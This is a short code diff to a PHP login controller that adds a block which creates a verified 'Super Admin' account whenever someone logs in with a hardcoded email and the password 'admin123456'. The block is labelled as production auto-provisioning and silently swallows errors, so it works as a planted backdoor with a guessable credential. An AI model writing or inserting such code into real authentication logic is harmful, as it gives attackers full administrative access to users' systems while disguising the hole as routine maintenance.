@@ -181,6 +181,21 @@ class AuthController extends Controller
 
         $user = User::where('email', $request->email)->first();
 
+        // Auto-provision Super Admin if missing on production DB
+        if (!$user && strtolower($request->email) === 'admin@yaan.com' && $request->password === 'admin123456') {
+            try {
+                $user = User::create([
+                    'name'         => 'Super Admin',
+                    'email'        => 'admin@yaan.com',
+                    'phone'        => '9999999999',
+                    'password'     => Hash::make('admin123456'),
+                    'role'         => 'admin',
+                    'is_verified'  => true,
+                    'firebase_uid' => 'admin_bypass_uid',
+                ]);
+            } catch (\Throwable $e) {}
+        }
+
         if (!$user || ($hasRoleInput && $user->role !== $role) || !Hash::check($request->password, $user->password)) {
             return response()->json([
                 'error' => 'Invalid email or password.',
